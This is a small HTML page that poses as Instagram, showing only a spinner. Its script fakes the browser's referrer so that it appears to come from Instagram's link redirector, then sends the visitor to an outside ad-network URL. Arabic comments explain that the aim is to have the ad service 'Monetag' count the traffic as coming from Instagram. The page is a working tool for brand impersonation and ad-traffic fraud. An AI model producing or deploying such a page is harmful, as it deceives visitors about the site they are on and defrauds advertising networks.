<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="referrer" content="unsafe-url"> <title>Instagram</title>
    <style>
        body { background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #e1306c; border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="spinner"></div>

    <script type="text/javascript">
        (function() {
            var target = "https://otieu.com/4/9348255";
            var source = "https://l.instagram.com/?u=https://www.instagram.com/";

            // خدعة "تثبيت المصدر" غصب عن المتصفح
            try {
                Object.defineProperty(document, 'referrer', {get : function(){ return source; }});
            } catch(e) {}

            // أهم خطوة: التحويل باستخدام "window.location.href" بدل "replace" 
            // ده بيخلي المتصفح يسجل المصدر في الـ History بتاعه
            setTimeout(function() {
                window.location.href = target;
            }, 600); // زودنا المدة شوية عشان نضمن إن "مونيتاج" لقطت المصدر
        })();
    </script>
</body>
</html>
